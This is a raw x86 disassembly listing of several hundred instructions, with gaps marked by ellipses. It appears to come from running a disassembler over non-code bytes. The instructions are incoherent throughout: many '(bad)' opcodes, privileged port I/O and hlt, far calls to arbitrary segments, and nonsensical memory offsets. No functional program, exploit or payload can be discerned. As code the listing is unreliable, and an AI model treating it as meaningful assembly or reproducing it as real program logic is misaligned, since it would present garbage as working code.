  41faf7:	loop   0x41fb5d
  41faf9:	inc    esp
  41fafa:	push   esi
  41fafb:	and    DWORD PTR [ecx+0x4b],0xe19e5d74
  41fb02:	popf   
  41fb03:	mov    bl,BYTE PTR [esi]
  41fb05:	fdiv   QWORD PTR [eax-0x633dba41]
  41fb0b:	fild   WORD PTR ds:0xc11df922
  41fb11:	js     0x41fb43
  41fb13:	fldcw  WORD PTR [eax*8-0x7ffa085]
  41fb1a:	ins    BYTE PTR es:[edi],dx
  41fb1b:	stos   BYTE PTR es:[edi],al
  41fb1c:	mov    edi,0x1c45eaca
  41fb21:	out    0x9b,al
  41fb23:	pop    edi
  41fb24:	cmp    BYTE PTR [edi+ebx*2+0x67],ch
  41fb28:	gs in  eax,0xbc
  41fb2b:	int3   
  41fb2c:	xchg   esi,eax
  41fb2d:	inc    esp
  41fb2e:	int    0x30
  41fb30:	cli    
  41fb31:	sbb    dl,BYTE PTR [ebp-0x1f124040]
  41fb37:	dec    esi
  41fb38:	ds and al,0x88
  41fb3b:	jne    0x41fb08
  41fb3d:	mov    al,0xaf
  41fb3f:	jae    0x41faf2
  41fb41:	imul   edi,edx,0xffffffcf
  41fb44:	lods   eax,DWORD PTR ds:[esi]
  41fb45:	cmc    
  41fb46:	mov    ch,0xd8
  41fb48:	shl    DWORD PTR [ebp-0x78782b55],cl
  41fb4e:	adc    eax,DWORD PTR [edx]
  41fb50:	pop    ds
  41fb51:	loopne 0x41fb16
  41fb53:	adc    BYTE PTR [esi+0x78de86be],dh
  41fb59:	retf   
  41fb5a:	jmp    0x2c5a064b
  41fb5f:	mov    eax,0xa15c2e90
  41fb64:	push   ds
  41fb65:	mov    ebp,0xb7a43a4f
  41fb6a:	sbb    BYTE PTR [eax+0x62],dl
  41fb6d:	gs (bad) 
  41fb70:	cmp    ebx,DWORD PTR [ebx]
  41fb72:	jmp    0x56f13fc8
  41fb77:	enter  0x63f2,0x6e
  41fb7b:	mov    ch,0x89
  41fb7d:	aas    
  41fb7e:	add    ebx,DWORD PTR [ecx+0x24]
  41fb81:	test   DWORD PTR [ecx],0x976e2a83
  41fb87:	mov    esi,0xee7bf5f5
  41fb8c:	cmp    al,BYTE PTR [edx+0xe88d]
	...
  41fbf2:	add    BYTE PTR [eax],al
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	test   eax,0xd4e970c9
  41fc05:	push   ecx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	xor    eax,0xd07293e1
  41fc11:	jae    0x41fb93
  41fc13:	jecxz  0x41fc54
  41fc15:	add    ch,BYTE PTR [ecx+0x1e]
  41fc18:	shl    ebp,0x1d
  41fc1b:	mov    ecx,DWORD PTR [edi+eax*2]
  41fc1e:	test   eax,0xa137559b
  41fc23:	inc    edi
  41fc24:	aad    0x5a
  41fc26:	out    0x43,eax
  41fc28:	dec    edi
  41fc29:	aas    
  41fc2a:	in     al,0xb1
  41fc2c:	ins    BYTE PTR es:[edi],dx
  41fc2d:	lahf   
  41fc2e:	aas    
  41fc2f:	adc    BYTE PTR fs:[ebp-0x1858d213],ch
  41fc36:	ja     0x41fc86
  41fc38:	add    BYTE PTR [eax+esi*8],0x59
  41fc3c:	mov    dh,0x85
  41fc3e:	hlt    
  41fc3f:	repnz dec ecx
  41fc41:	ins    DWORD PTR es:[edi],dx
  41fc42:	cmp    eax,0xe29cd0ff
  41fc47:	jbe    0x41fcaa
  41fc49:	fsubr  DWORD PTR [ecx+0x5dcf9238]
  41fc4f:	inc    ah
  41fc51:	add    BYTE PTR [ecx],bl
  41fc53:	push   DWORD PTR [ebx]
  41fc55:	mov    eax,0x7ba97721
  41fc5a:	mov    cl,0x5
  41fc5c:	add    BYTE PTR [edx+0x66896a6f],ah
  41fc62:	fidiv  DWORD PTR [ecx+0xb]
  41fc65:	call   esp
  41fc67:	sub    dl,BYTE PTR [ebx+0x76]
  41fc6a:	(bad)  
  41fc6b:	xor    al,0x4e
  41fc6d:	or     esi,DWORD PTR [esi]
  41fc6f:	xor    al,0x2c
  41fc71:	sbb    BYTE PTR [esi*4-0x5a583c65],0xc6
  41fc79:	mov    dl,BYTE PTR [edi+edx*8]
  41fc7c:	cmp    ah,BYTE PTR ss:[esi]
  41fc7f:	retf   0xca86
  41fc82:	and    eax,edi
  41fc84:	shr    al,1
  41fc86:	and    eax,0xd158da8f
  41fc8b:	jnp    0x41fc0e
  41fc8d:	daa    
  41fc8e:	sbb    eax,0x4dfecd91
  41fc93:	pushf  
  41fc94:	add    DWORD PTR [edx-0x2b],esi
  41fc97:	jbe    0x41fc77
  41fc99:	xchg   esi,eax
  41fc9a:	jns    0x41fc5f
  41fc9c:	xchg   ebp,eax
  41fc9d:	je     0x41fc68
  41fc9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fca0:	sbb    al,0x65
  41fca2:	push   esp
  41fca3:	adc    ah,BYTE PTR [eax+edi*4+0x43d560d4]
  41fcaa:	mov    edx,0xda8be9de
  41fcaf:	int3   
  41fcb0:	fcomi  st,st(1)
  41fcb2:	or     al,0x7
  41fcb4:	push   0xad29917c
  41fcb9:	out    0x55,al
  41fcbb:	cli    
  41fcbc:	pop    esi
  41fcbd:	dec    ecx
  41fcbe:	rol    DWORD PTR [esi-0x8],cl
  41fcc1:	mov    dl,0x62
  41fcc3:	fisub  WORD PTR [edi]
  41fcc5:	adc    al,0x9a
  41fcc7:	cmp    eax,ebx
  41fcc9:	cmp    al,0x38
  41fccb:	adc    al,0x39
  41fccd:	sub    DWORD PTR [ebx+0x66],ecx
  41fcd0:	fsub   DWORD PTR [edx]
  41fcd2:	out    dx,al
  41fcd3:	test   al,0xa2
  41fcd5:	outs   dx,DWORD PTR ds:[esi]
  41fcd6:	mov    bh,0x4c
  41fcd8:	xchg   ebp,eax
  41fcd9:	mov    dh,0xfc
  41fcdb:	mov    ?,WORD PTR [edx]
  41fcdd:	dec    esp
  41fcde:	xor    al,0x3a
  41fce0:	mov    eax,ds:0x3464f32f
  41fce5:	outs   dx,DWORD PTR ds:[esi]
  41fce6:	fwait
  41fce7:	mov    ah,0x11
  41fce9:	mov    edx,0xce379aaf
  41fcee:	xchg   BYTE PTR [ebp+0x5786cc88],al
  41fcf4:	mov    ?,esi
  41fcf6:	sub    dl,bl
  41fcf8:	pusha  
  41fcf9:	xchg   esp,eax
  41fcfa:	gs adc eax,0xa5ee41b3
  41fd00:	add    eax,0x2705b149
  41fd05:	loopne 0x41fd6a
  41fd07:	xor    BYTE PTR [edx-0x4f8669a7],cl
  41fd0d:	adc    DWORD PTR [ecx-0x61],edi
	...
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	push   edi
  41fd81:	adc    esp,DWORD PTR ds:0x152d829
  41fd87:	add    BYTE PTR [ecx+eax*1],al
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	aas    
  41fd8d:	jno    0x41fe05
  41fd8f:	rcr    ebx,0xfc
  41fd92:	cmp    ebp,DWORD PTR [esi+0x3085a482]
  41fd98:	xor    dh,BYTE PTR [esp+eax*8]
  41fd9b:	sub    eax,0x8894f125
  41fda0:	xchg   ebp,eax
  41fda1:	pop    ebp
  41fda2:	hlt    
  41fda3:	rol    edi,cl
  41fda5:	adc    al,BYTE PTR [ecx+0x2b]
  41fda8:	ret    0x479f
  41fdab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdac:	inc    edi
  41fdad:	loop   0x41fd50
  41fdaf:	jae    0x41fd77
  41fdb1:	cmp    esi,ecx
  41fdb3:	call   0x693e:0x99eb9139
  41fdba:	add    al,0xe5
  41fdbc:	sub    al,0x18
  41fdbe:	aad    0xad
  41fdc0:	mov    dh,0x80
  41fdc2:	out    dx,eax
  41fdc3:	data16 cmp BYTE PTR ds:0x87a6fd9a,cl
  41fdca:	mov    al,0x17
  41fdcc:	fnstsw WORD PTR [ecx+0x2f]
  41fdcf:	jb     0x41fe25
  41fdd1:	pcmpeqw mm5,mm2
  41fdd4:	lods   eax,DWORD PTR ds:[esi]
  41fdd5:	(bad)  
  41fdd6:	cli    
  41fdd7:	stos   BYTE PTR es:[edi],al
  41fdd8:	xchg   BYTE PTR [esi],dh
  41fdda:	cwde   
  41fddb:	jae    0x41fe1d
  41fddd:	inc    eax
  41fdde:	xor    al,0x13
  41fde0:	rcr    DWORD PTR [ebx-0x79259825],cl
  41fde6:	or     eax,0x16ffa48d
  41fdeb:	icebp  
  41fdec:	int    0xc2
  41fdee:	jo     0x41fe46
  41fdf0:	les    eax,FWORD PTR [edx]
  41fdf2:	sub    eax,0x18363c21
  41fdf7:	mov    bh,0x81
  41fdf9:	pop    edx
  41fdfa:	lahf   
  41fdfb:	jb     0x41fdc7
  41fdfd:	sbb    esi,DWORD PTR [eax+0x71]
  41fe00:	and    al,BYTE PTR [edi-0x7]
  41fe03:	push   edi
  41fe04:	dec    esi
  41fe05:	mov    ecx,DWORD PTR [edx+0x4295b04c]
  41fe0b:	inc    esp
  41fe0c:	jne    0x41fdb9
  41fe0e:	jno    0x41fe0f
  41fe10:	or     esp,ebp
  41fe12:	ficom  DWORD PTR [esi]
  41fe14:	retf   0x267a
  41fe17:	(bad)  
  41fe18:	cdq    
  41fe19:	jae    0x41fdc0
  41fe1b:	add    DWORD PTR [eax+0x264c4230],ebp
  41fe21:	test   DWORD PTR [edi],edi
  41fe23:	hlt    
  41fe24:	mov    al,0x1b
  41fe26:	ret    0x6e9b
  41fe29:	dec    esp
  41fe2a:	enter  0x4145,0xc3
  41fe2e:	inc    eax
  41fe2f:	cmp    bh,bl
  41fe31:	in     al,dx
  41fe32:	imul   edi,DWORD PTR [edx-0x598a6726],0xffffffa9
  41fe39:	cmp    cl,BYTE PTR [eax-0x406eaa3f]
  41fe3f:	(bad)  
  41fe43:	jno    0x41fdfb
  41fe45:	je     0x41fe14
  41fe47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe48:	loope  0x41fe9e
  41fe4a:	mov    ebx,0x4d715ed8
  41fe4f:	mov    bh,0x5a
  41fe51:	cmp    BYTE PTR [ebx+0x21],dl
  41fe54:	lods   eax,DWORD PTR ds:[esi]
  41fe55:	fstp   TBYTE PTR es:[edx+ebx*4-0xc]
  41fe5a:	push   esp
  41fe5b:	cdq    
  41fe5c:	inc    esp
  41fe5d:	mov    dh,0x9a
  41fe5f:	mov    cl,BYTE PTR [edx+0x5d]
  41fe62:	in     eax,0x61
  41fe64:	fwait
  41fe65:	fs inc esi
  41fe67:	fidiv  DWORD PTR [ebx+0x5004f0de]
  41fe6d:	xchg   ecx,eax
  41fe6e:	mov    al,gs:0x7be9c712
  41fe74:	cld    
  41fe75:	mov    cl,0x64
  41fe77:	cmp    BYTE PTR ds:0x3c1f52de,dl
  41fe7d:	int    0x75
  41fe7f:	xchg   esp,eax
  41fe80:	adc    eax,0x87a0b7d
  41fe85:	sbb    al,0x88
  41fe87:	sbb    ch,ch
  41fe89:	mov    DWORD PTR [ecx+ebx*1],eax
  41fe8c:	int    0x6
  41fe8e:	sub    ecx,eax
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x3b
  41ff01:	add    edi,DWORD PTR [edx+0x153dcc8]
  41ff07:	add    BYTE PTR [ecx+eax*1],al
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	mov    edi,0x62245d77
  41ff12:	sbb    cl,BYTE PTR [eax+ecx*1-0x65]
  41ff16:	fcmovnb st,st(3)
  41ff18:	cmc    
  41ff19:	adc    dh,0xea
  41ff1c:	(bad)  
  41ff1d:	xor    ebx,DWORD PTR [esi+0x1c]
  41ff20:	mov    al,ds:0x4968f307
  41ff25:	or     BYTE PTR [eax],0xb2
  41ff28:	cmc    
  41ff29:	jg     0x41ff85
  41ff2b:	push   ebx
  41ff2c:	iret   
  41ff2d:	imul   edi,DWORD PTR [edi+edi*4+0x1c],0xc492ad76
  41ff35:	stc    
  41ff36:	push   esi
  41ff37:	inc    ecx
  41ff38:	cmp    al,0x99
  41ff3a:	push   esp
  41ff3b:	add    dh,0x2d
  41ff3e:	xchg   edi,eax
  41ff3f:	and    dh,BYTE PTR ds:0xa8144b1f
  41ff45:	addr16 and al,0x25
  41ff48:	add    BYTE PTR ds:0x49970b4e,dl
  41ff4e:	xor    DWORD PTR [ebx],edi
  41ff50:	ss jp  0x41fee6
  41ff53:	in     eax,0x96
  41ff55:	mov    esp,0x834ea346
  41ff5a:	xchg   ebp,eax
  41ff5b:	mov    ecx,0x6587aca5
  41ff60:	pop    esi
  41ff61:	test   BYTE PTR [edi],dh
  41ff63:	mov    dl,0x94
  41ff65:	mov    ds:0xf372b8e2,al
  41ff6a:	push   0xffffffa7
  41ff6c:	adc    DWORD PTR [eax+ecx*8],ebx
  41ff6f:	ja     0x41ff99
  41ff71:	in     eax,dx
  41ff72:	lods   eax,DWORD PTR ds:[esi]
  41ff73:	push   eax
  41ff74:	out    dx,al
  41ff75:	add    al,0xd4
  41ff77:	cmp    BYTE PTR ds:0x6f6a2d89,0x46
  41ff7e:	sbb    esp,eax
  41ff80:	sahf   
  41ff81:	int    0x6d
  41ff83:	dec    edi
  41ff84:	repnz mov al,BYTE PTR gs:[ebx]
  41ff88:	xchg   DWORD PTR [edi+0x1fc1779e],eax
  41ff8e:	icebp  
  41ff8f:	adc    DWORD PTR [edi],esp
  41ff91:	retf   0xa54a
  41ff94:	pop    eax
  41ff95:	fstp   DWORD PTR [ebp+ebx*2+0x0]
  41ff99:	pop    ebx
  41ff9a:	add    dl,BYTE PTR [edx+0x5424fa0f]
  41ffa0:	push   esi
  41ffa1:	push   ss
  41ffa2:	in     eax,0x36
  41ffa4:	out    0x35,eax
  41ffa6:	sbb    BYTE PTR [edi*1-0xa9e46f1],0xd5
  41ffae:	fsubrp st(2),st
  41ffb0:	xchg   DWORD PTR [ebp-0x1feb24d7],ebx
  41ffb6:	sub    BYTE PTR [edi+0x44c5092f],bh
  41ffbc:	stos   DWORD PTR es:[edi],eax
  41ffbd:	(bad)  
  41ffbe:	mov    eax,0x2def6c4e
  41ffc3:	xchg   BYTE PTR [esi+0x5ca0a150],dl
  41ffc9:	aas    
  41ffca:	clc    
  41ffcb:	add    al,0xdb
  41ffcd:	cmp    esi,DWORD PTR [edx+0x77]
  41ffd0:	lea    eax,[esi+ebp*4-0x27]
  41ffd4:	mov    ebp,0x730b81c3
  41ffd9:	cmc    
  41ffda:	push   esi
  41ffdb:	adc    al,0x8f
  41ffdd:	and    dl,BYTE PTR [ebx+ebp*2-0x6c]
  41ffe1:	retf   
  41ffe2:	push   eax
  41ffe3:	adc    eax,0x219e65a3
  41ffe8:	mov    eax,0xdc75782a
  41ffed:	add    BYTE PTR [eax+0x36],0xe9
  41fff1:	and    eax,0x622378a7
  41fff6:	je     0x41ffec
  41fff8:	mov    cl,0xb3
  41fffa:	adc    al,0x68
  41fffc:	pushf  
  41fffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fffe:	jmp    edi
  420000:	pop    edi
  420001:	xor    DWORD PTR [ebx+edi*2+0x1d],ecx
  420005:	pop    eax
  420006:	clc    
  420007:	leave  
  420008:	and    eax,0x4dd1d47f
  42000d:	xchg   DWORD PTR es:[esi+0x0],esp
	...
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xf
  420081:	sti    
  420082:	cli    
  420083:	add    al,0xe0
  420085:	push   esp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	cmc    
  42008d:	lahf   
  42008e:	sbb    esi,DWORD PTR [eax+ebx*1]
  420091:	adc    al,0xb7
  420093:	mov    edi,0x2ce9762d
  420098:	dec    ecx
  420099:	jno    0x4200fb
  42009b:	(bad)  
  42009d:	test   BYTE PTR ds:[ebx+0x3455e873],bh
  4200a4:	retf   
  4200a5:	jo     0x42005c
  4200a7:	sub    DWORD PTR [edi-0xc],ebp
  4200aa:	in     al,0xc0
  4200ac:	js     0x42008f
  4200ae:	inc    edx
  4200af:	test   BYTE PTR [edi+ebx*8-0x7a],0x7a
  4200b4:	stos   DWORD PTR es:[edi],eax
  4200b5:	js     0x4200db
  4200b7:	jnp    0x42005e
  4200b9:	sbb    al,0xfb
  4200bb:	outs   dx,DWORD PTR ds:[esi]
  4200bc:	jno    0x4200e6
  4200be:	pusha  
  4200bf:	shl    BYTE PTR [esi],0x9d
  4200c2:	pop    ss
  4200c3:	retf   0x637
  4200c6:	imul   DWORD PTR [edx-0x45]
  4200c9:	dec    ebx
  4200ca:	mov    esp,0x12463a0f
  4200cf:	or     al,BYTE PTR [edx+eiz*1]
  4200d2:	push   ecx
  4200d3:	arpl   bx,bx
  4200d5:	push   0x6e
  4200d7:	stos   DWORD PTR es:[edi],eax
  4200d8:	xchg   ebx,eax
  4200d9:	retf   0xbab5
  4200dc:	inc    ebp
  4200dd:	xor    ah,cl
  4200df:	aam    0xf3
  4200e1:	test   BYTE PTR ds:0x4ae61e5b,bh
  4200e7:	lods   al,BYTE PTR ds:[esi]
  4200e8:	scas   al,BYTE PTR es:[edi]
  4200e9:	xchg   edi,eax
  4200ea:	adc    al,BYTE PTR [eax+0x44]
  4200ed:	test   BYTE PTR [edx-0x42],ah
  4200f0:	mov    ah,0x87
  4200f2:	or     al,0x95
  4200f4:	es addr16 sub al,0x88
  4200f8:	and    eax,0x6932b832
  4200fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200fe:	(bad)  
  4200ff:	xor    ebp,ebx
  420101:	ret    0xfa47
  420104:	mov    ah,0x45
  420106:	jo     0x4200fd
  420108:	add    al,0xa1
  42010a:	out    dx,eax
  42010b:	out    dx,al
  42010c:	ins    BYTE PTR es:[edi],dx
  42010d:	hlt    
  42010e:	mov    WORD PTR [esi-0x5fdcbbe],?
  420114:	or     dh,BYTE PTR [edx-0x4d]
  420117:	add    al,0xcc
  420119:	jno    0x4200ef
  42011b:	(bad)  
  42011c:	xor    BYTE PTR [ebx],dl
  42011e:	xor    eax,0x430cafd
  420123:	add    dh,ch
  420125:	or     esp,DWORD PTR [ecx-0x3]
  420128:	sbb    ebx,DWORD PTR [ecx+0x63]
  42012b:	sub    edi,ecx
  42012d:	lahf   
  42012e:	dec    esi
  42012f:	inc    esi
  420130:	jne    0x420182
  420132:	mov    al,ds:0x85aada6c
  420137:	push   es
  420138:	fist   DWORD PTR [edx+0x665fc517]
  42013e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42013f:	jle    0x420186
  420141:	les    esp,FWORD PTR [edi+0x13]
  420144:	fisttp QWORD PTR [ebp+esi*2-0x18]
  420148:	dec    edx
  420149:	test   ah,dl
  42014b:	sar    DWORD PTR [edx-0x40],0x41
  42014f:	dec    ebp
  420150:	mov    ch,0x37
  420152:	(bad)  
  420153:	ficom  DWORD PTR ds:0xc65ce356
  420159:	pop    ebx
  42015a:	push   edx
  42015b:	push   eax
  42015c:	lods   al,BYTE PTR ds:[esi]
  42015d:	inc    edx
  42015e:	out    dx,eax
  42015f:	and    al,0x43
  420161:	(bad)  
  420163:	aas    
  420164:	mov    eax,0x86941cfb
  420169:	dec    BYTE PTR [ecx+0x3]
  42016c:	cmc    
  42016d:	sbb    bl,BYTE PTR ds:0x4f62d975
  420173:	push   cs
  420174:	retf   0xba03
  420177:	dec    eax
  420178:	mov    al,ds:0x9ee7fe11
  42017d:	outs   dx,BYTE PTR ds:[esi]
  42017e:	js     0x420105
  420180:	dec    ebx
  420182:	addr16 mov ecx,0x75ae8e1d
  420188:	push   ss
  420189:	outs   dx,BYTE PTR ds:[esi]
  42018a:	inc    ecx
  42018b:	arpl   WORD PTR [ebx+0x80f071],si
	...
  4201f1:	add    BYTE PTR [eax],al
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x7db08e5],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	pop    ebx
  42020d:	mov    dl,0x46
  42020f:	adc    DWORD PTR [eax],edx
  420211:	cs mov edi,0x92e01478
  420217:	into   
  420218:	pop    ebx
  420219:	adc    eax,0x82947e31
  42021e:	jns    0x4201d9
  420220:	pop    edx
  420221:	pop    ss
  420222:	out    dx,al
  420223:	jb     0x420218
  420225:	mov    ds:0xbf31a667,al
  42022a:	imul   esp,DWORD PTR [edi],0x61d5ee1f
  420230:	popf   
  420231:	aam    0x1e
  420233:	test   BYTE PTR [eax+0x1a6ee709],bl
  420239:	pop    ds
  42023a:	sbb    BYTE PTR [eax],dh
  42023c:	mul    al
  42023e:	out    0x49,eax
  420240:	mov    WORD PTR [edi+0x22ddc23c],ds
  420246:	mov    ecx,0xf5e11a95
  42024b:	or     al,0x51
  42024d:	xor    al,0x5c
  42024f:	jo     0x4201ea
  420251:	jmp    0x115aeb1f
  420256:	and    eax,0x86f7659e
  42025b:	ins    BYTE PTR es:[edi],dx
  42025c:	inc    edx
  42025d:	sar    BYTE PTR [eax+0x79],cl
  420260:	fisub  DWORD PTR [ebx+0x28ba8f1f]
  420266:	popf   
  420267:	mov    ecx,0x586ef10a
  42026c:	inc    edx
  42026d:	xlat   BYTE PTR ds:[ebx]
  42026e:	pop    ds
  42026f:	push   ds
  420270:	pop    es
  420271:	pushf  
  420272:	xor    cl,bl
  420274:	jb     0x42020b
  420276:	jb     0x420235
  420278:	cmc    
  420279:	mov    ebx,0xd5fabd2b
  42027e:	ss call 0x97fd1acc
  420284:	mov    edx,0x99e4e6b2
  420289:	push   cs
  42028a:	sbb    cl,bl
  42028c:	fcmovne st,st(2)
  42028e:	mov    bl,0xe7
  420290:	jb     0x420212
  420292:	jmp    0x420297
  420294:	icebp  
  420295:	fwait
  420296:	sti    
  420297:	popa   
  420298:	dec    ebp
  420299:	js     0x42026d
  42029b:	sub    BYTE PTR [esi],dl
  42029d:	sub    BYTE PTR [esi+0x190e8a9a],0x8f
  4202a4:	daa    
  4202a5:	xlat   BYTE PTR ds:[ebx]
  4202a6:	test   DWORD PTR [eax],ebp
  4202a8:	add    eax,DWORD PTR [ebx+0x77b34059]
  4202ae:	xchg   ebx,eax
  4202af:	add    BYTE PTR [ebx-0xe],bl
  4202b2:	or     DWORD PTR [ebp*4+0x76867759],ecx
  4202b9:	inc    ebp
  4202ba:	ret    0xc8b4
  4202bd:	or     ebp,esi
  4202bf:	pop    ebp
  4202c0:	mov    ch,0x33
  4202c2:	(bad)  
  4202c3:	cmp    al,0x11
  4202c5:	sub    dl,BYTE PTR [esi-0x2e]
  4202c8:	push   0x57
  4202ca:	pop    esp
  4202cb:	fsubr  DWORD PTR [edi+edx*4+0x686d8eb5]
  4202d2:	xor    DWORD PTR ds:0x29fb8b43,ebp
  4202d8:	mov    dh,BYTE PTR [ecx]
  4202da:	cdq    
  4202db:	mov    dh,0x34
  4202dd:	jp     0x4202d2
  4202df:	push   eax
  4202e0:	add    BYTE PTR [ebp-0xa83d1fa],0x61
  4202e7:	popa   
  4202e8:	pop    edx
  4202e9:	push   0xb5dc7a3d
  4202ee:	sub    cl,BYTE PTR [esi-0x79]
  4202f1:	out    0x83,eax
  4202f3:	push   ds
  4202f4:	adc    eax,0x45e5f196
  4202f9:	out    0x4b,al
  4202fb:	arpl   WORD PTR [esi],sp
  4202fd:	repnz sbb BYTE PTR [ecx+0x3d],cl
  420301:	sub    BYTE PTR [ecx+0xcc80674],ah
  420307:	and    dh,BYTE PTR [ecx]
  420309:	ja     0x420354
  42030b:	push   ebp
  42030c:	xchg   esp,eax
  42030d:	or     eax,0x7f83
	...
  420372:	add    BYTE PTR [eax],al
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	xor    edi,DWORD PTR [bx]
  420383:	sub    ebp,eax
  420385:	push   esi
  420386:	add    DWORD PTR [eax],eax
  420388:	add    al,0x1
  42038a:	add    BYTE PTR [eax],al
  42038c:	add    DWORD PTR [esi],edi
  42038e:	inc    esi
  42038f:	ja     0x420410
  420391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420393:	mov    ds:0x3cdcff0a,eax
  420398:	sbb    eax,0x805a58d
  42039d:	iret   
  42039e:	call   0xcd75c754
  4203a3:	sub    esp,DWORD PTR [edi+0x7d]
  4203a6:	std    
  4203a7:	es scas eax,DWORD PTR es:[edi]
  4203a9:	fsub   st(3),st
  4203ab:	test   al,0x7
  4203ad:	dec    ebp
  4203ae:	cmp    DWORD PTR [eax],ebp
  4203b0:	in     al,dx
  4203b1:	sbb    al,0x3a
  4203b3:	gs test bl,bl
  4203b6:	mov    eax,0xcecc3b67
  4203bb:	jbe    0x420439
  4203bd:	xchg   DWORD PTR [esi],esi
  4203bf:	cmp    ebp,DWORD PTR [esi+0x68]
  4203c2:	sbb    dh,BYTE PTR [eax]
  4203c4:	add    BYTE PTR [esi+0x69],bh
  4203c7:	jmp    0xb5ba72c8
  4203cc:	inc    eax
  4203cd:	outs   dx,BYTE PTR ds:[esi]
  4203ce:	add    BYTE PTR [edx-0x5b372d62],bh
  4203d4:	xchg   esi,eax
  4203d5:	mov    dh,0x35
  4203d7:	cmp    cl,0xd0
  4203da:	fidiv  DWORD PTR [ebx+ecx*4]
  4203dd:	dec    ebp
  4203de:	or     BYTE PTR [eax],al
  4203e0:	addr16 dec ebx
  4203e2:	gs push cs
  4203e4:	(bad)  
  4203e5:	pushf  
  4203e6:	aaa    
  4203e7:	push   esi
  4203e8:	cmc    
  4203e9:	xchg   esp,eax
  4203ea:	(bad)  
  4203eb:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4203ed:	out    dx,al
  4203ee:	daa    
  4203ef:	or     DWORD PTR [ecx-0x11aa132a],ebp
  4203f5:	(bad)  [ebx+0x2d]
  4203f8:	or     bl,BYTE PTR [edx+0x40c1abcb]
  4203fe:	loopne 0x4203aa
  420400:	xor    cl,ch
  420402:	jne    0x420452
  420404:	lods   eax,DWORD PTR ds:[esi]
  420405:	mov    ds:0x6e3947aa,eax
  42040a:	loopne 0x420461
  42040c:	and    BYTE PTR [edi],ch
  42040e:	mov    ebx,0x53bcb76d
  420413:	out    dx,al
  420414:	(bad)  
  420415:	mov    bl,0xfb
  420417:	(bad)  
  420418:	popf   
  420419:	xor    esi,DWORD PTR [edi]
  42041b:	fild   DWORD PTR [edx-0x1d]
  42041e:	cmp    al,0x24
  420420:	ins    DWORD PTR es:[edi],dx
  420421:	pop    ecx
  420422:	add    BYTE PTR [edi],0xbf
  420425:	test   BYTE PTR [ebx],bl
  420427:	dec    edi
  420428:	adc    al,0x2b
  42042a:	sahf   
  42042b:	es in  eax,dx
  42042d:	sbb    ch,BYTE PTR [edx-0x43513b08]
  420433:	and    esp,DWORD PTR [ecx+0x5ddb5293]
  420439:	dec    ebp
  42043a:	lock xchg BYTE PTR [eax+0x67b43538],bl
  420441:	shl    DWORD PTR [ecx+ebp*1+0x16],1
  420445:	aad    0x30
  420447:	inc    esp
  420448:	(bad)  
  420449:	mov    bl,0xdf
  42044b:	fldenv [esi-0x66]
  42044e:	push   esi
  42044f:	add    dh,ch
  420451:	lahf   
  420452:	inc    edi
  420453:	pop    eax
  420454:	xor    al,0x72
  420456:	fistp  WORD PTR [edi-0x760f1557]
  42045c:	loope  0x4204dc
  42045e:	jge    0x42040d
  420460:	ds adc DWORD PTR es:[eax+0x6],0x7e3b4ba6
  420469:	sub    BYTE PTR [ebx],bh
  42046b:	add    BYTE PTR [esi],bl
  42046d:	lods   eax,DWORD PTR ds:[esi]
  42046e:	sub    eax,0xb795a62f
  420473:	cmp    eax,0x1f188f41
  420478:	dec    edx
  420479:	clc    
  42047a:	call   0x47b:0xec5401ac
  420481:	std    
  420482:	pop    edi
  420483:	or     eax,DWORD PTR [ebx-0x7f]
  420486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420487:	gs dec ebx
  420489:	pop    ds
  42048a:	aas    
  42048b:	add    al,0x4f
  42048d:	out    dx,eax
  42048e:	std    
  42048f:	pop    ecx
	...
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	push   esi
  420501:	inc    ecx
  420502:	or     al,0xe2
  420504:	in     al,dx
  420505:	push   edi
  420506:	add    DWORD PTR [eax],eax
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	fst    QWORD PTR [esi+ecx*4-0x6a]
  420510:	inc    esp
  420511:	arpl   WORD PTR [eax-0x52],sp
  420514:	adc    BYTE PTR ds:0x84746be6,ah
